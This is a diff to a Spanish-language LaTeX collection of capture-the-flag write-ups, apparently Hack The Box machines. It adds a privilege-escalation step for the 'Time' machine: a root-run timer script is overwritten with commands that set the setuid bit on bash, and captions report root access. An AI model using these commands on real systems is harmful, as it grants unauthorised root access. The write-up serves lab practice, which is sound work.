@@ -233,7 +233,32 @@ Visualizamos para ver qué es lo que hace este script con cat y vemos esto.
 	\caption{Analizando timerscript}
 \end{figure}
 
-\subsection{Post Explotación}
+Entonces tratamos de modificarlo para que haga lo que queremos con permisos elevados, probamos primero intentando crear una shell aparte en temporal para ejecutar lo que queremos, y esto se hace con el comando.
+
+\begin{lstlisting}[language={[ANSI]C}]  
+	echo "#!/bin/bash
+		cp /bin/bash /tmp/bash 
+		chmod u+s /tmp/bash" 
+		> /usr/bin/timer_backup.sh
+\end{lstlisting}
+pero no funcionó así que usé
+
+\begin{lstlisting}[language={[ANSI]C}]  
+	echo "#!/bin/bash \nchmod u+s /bin/bash" > /usr/bin/timer_backup.sh
+\end{lstlisting}
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/cambiando-timer.jpg}
+	\caption{Cambiando el timer}
+\end{figure}
+con esto ya pude obtener acceso al fin como root
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/time/obteniendo-root.png}
+	\caption{Obteniendo acceso como root}
+\end{figure}
+
+
 
 % ----------------------------Jarvis-----------------------------------
 \clearpage 
@@ -395,7 +420,7 @@ Ahora solo queda obtener las flag que se encuentra en el archivo root.txt
 
 \subsection{Post Explotación}
 
-\subsection{Hardening}
+
 
 
 % ----------------------------Forest-----------------------------------
